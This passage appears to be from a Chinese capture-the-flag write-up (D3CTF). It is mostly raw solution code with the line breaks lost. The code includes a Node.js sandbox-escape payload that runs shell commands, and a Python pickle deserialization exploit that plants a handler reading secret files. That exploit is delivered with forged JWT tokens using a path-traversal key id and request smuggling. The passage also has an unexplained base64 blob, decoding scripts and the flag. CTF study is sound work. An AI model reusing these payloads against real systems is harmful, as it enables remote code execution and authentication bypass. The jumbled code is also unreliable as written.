JGNmJE4keSRhMSRhY2MkYjkkODAkOTUkQ1YkTHgkYTEkSSQ1YiRjNyQ5YSQ4ZSQ5NyRNJGY5JE4k
WiRjYSRiNCRjZCQ5MHUkYWEkZmIkTSRkYWZ0JG0kWUokOWUkTSRjNSRlZXAkZDAkViRmMXckZGUk
ZWQkVGN5USRjMCRmYiRmYiQzYyQ5NiRjYSRiZiRzJGI1JGY0UCRzJGE0JGUxbSRmMiQ3ZSRkMGIk
YzgkZmQkZ3AkWjIkeTgkM2YkYmQkcCQzZSRlMm4kOWYkODckM2QkZDdPYyRaJGY2WmN5JGskZjdG
JE1zJDhmJDg0JFokOGMkYWQkOTMkNDAkaSRhNzIkSyRUJGokYWYkYzgkZjckYTNhJGkkODhtJGE5
WiRWVSQ4YiQ5YSRhYTJhJGUwJDg5JDhlJGQ3JHMkZGUkYTAkYzIwc18kODkkYmF0eXIkYzgkOTBZ
JFAkWSRkZSRhYm8kN2IkNWQkZGEkZWQkOGEkZWQkayQ4OCQ5MSQ5YiRHJGM3biRhMyRmZSRhOSRm
NiRiMVkkZmJQJGZmUms0JDNlJGJiTSQzYXYkYmQkNWRpJDk4eCRMRyR6JDgxeiRkZFEkZGUkZWIk
ayQ4OSRtJGE1JGMxJHQkZDQkY2QkYjAkTSRiMyRUJGY2JGRiMEwkZTUkODAkZTY1eiRvJGJkcSRl
NiQ5ZCRhYSRmNyRtJDg3JGZlWCRUJHQkODIkZzkkOGYkYWUkZWIkVyRmNTUkOGUkQyQ5MSRxJHok
YWMkYTEkNDBPJGFhTiRHTCRlZCQ4MSRhY0kkOWVLJGM4JElzJGVmJGZlJDgyJGZkJGskODckYTck
YzgkZTYkYzdkJFckZDNkJGNkJGFiJEUkOTQwQ1gkYzQkeSR5JGNhUiRjNSQzYiRjNCRhYVgkZjkk
VSQ5OSRmYzkkYjIkOWQkYWMkYTUkZjkkaiRjZCRjYSRmOSQ5ZCQ5YyQ5NSRmNyRmZiQ0MCRmZjEk
OTE0JEkkOTUkZjAkUyRmNCQ1YiRiMmUkY2MkZTEkdiRlMSQzYyQ1ZCQ4ZCQ5OCRGJGJhJDhiJGUz
JDlhZyRmZiRCJGVhdjEkOWYkOGUkQyRBJEFaTk4=
');this.constructor.constructor('return process.mainModule.require(\'child_process\').execSync(\'cat /flag\').toString();')();//
class A():    def __reduce__(self):        return (eval,("open('/tmp/flag.py','w').write("class aaa:\n def GET(self):\n  return __import__('os').popen('cat /Secr3T_Flag').read()"),__import__('sys').path.append('/tmp'),globals().update({'index':
__import__('flag').__dict__['aaa']})",))a = A()b = pickle.dumps(a)
import os
from requests import Request, Sessionimport pickleimport base64
class A():    def __reduce__(self):        return (eval,("open('/tmp/flag.py','w').write("class aaa:\n def GET(self):\n  return __import__('os').popen('cat /Secr3T_Flag').read()"),__import__('sys').path.append('/tmp'),globals().update({'index':
__import__('flag').__dict__['aaa']})",))a = A()b = pickle.dumps(a)data=base64.b64encode(b)+b'BackdoorPasswordOnlyForAdmin'data = "{}rn{}rn0rnrn".format(hex(len(data))[2:], data.decode())print(data)c={'token':'eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uL3Byb2MvMS9jbWRsaW5lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNhZG1pbiI6dHJ1ZX0.47YQeGE7ASKvQS8kSrCQlGtGy9aoJmzFKu8cqUaL5kI'}#c={'token':'eyJhbGciOiJIUzI1NiIsImtpZCI6IjEudHh0IiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImEiLCJpc2FkbWluIjp0cnVlfQ.5JUJkbO4TQOoCJliTJhKHN4X3zPs7J_ehoPoAtXZnmM'}headers = {    'Transfer-Encoding': 'CHuNkeD',}s = Session()req = Request('POST', url='http://ip:
port/admin',data=data,cookies=c,headers=headers)prepped = req.prepare()prepped.headers['content-length']= str(len(base64.b64encode(b)))response = s.send(prepped)print(response.text)
def base9_to_decimal(nine_num):    decimal_num = 0    power = 0    for digit in reversed(nine_num):        decimal_num += int(digit) * (9 ** power)        power += 1    return decimal_num
def decrypt_base9(ciphertext):    plaintext = ""    for num in ciphertext:        decimal_num = base9_to_decimal(num)        plaintext += chr(decimal_num)    return plaintext
tmp = ['236','249','249','245','248','75','63','63','239','244','228','241','228','248','249','244','249','236','233','242','228','254','62','231','244','242','63','81','228','91','212','64','231','91','96','71','95','255','74','245','95','243','84','252','231','67','212','245','229','217','231','251','219','66','96','252','98','216','236','68','96','91','236','242','231','66','248','252','221','242','254','236','221','255','69','253','229','242','231','78']
for x in tmp:    flag = ''    for y in x:        flag +=chr(ord(y)-1)    print(flag,end=' ')ciphertext = '125 138 138 134 137 64 52 52 128 133 117 130 117 137 138 133 138 125 122 131 117 143 51 120 133 131 52 70 117 80 101 53 120 80 85 60 84 144 63 134 84 132 73 141 120 56 101 134 118 106 120 140 108 55 85 141 87 105 125 57 85 80 125 131 120 55 137 141 110 131 143 125 110 144 58 142 118 131 120 67'ciphertext = ciphertext.split()print('n')plaintext = decrypt_base9(ciphertext)print("解密后的文本:", plaintext)
https://koalastothemax.com/?aHR0cHM6Ly9pLnBvc3RpbWcuY2MvOVh4MHhmc2svZmxhZy5wbmc=
https://i.postimg.cc/9Xx0xfsk/flag.png
d3ctf{y0u_are_spells_m4ster}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/10-1714462318.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/0-1714462320.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/7-1714462321.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/1-1714462322.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/2-1714462324.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/6-1714462324.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/0-1714462325.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/10-1714462326.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/4-1714462327.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/0-1714462329.png)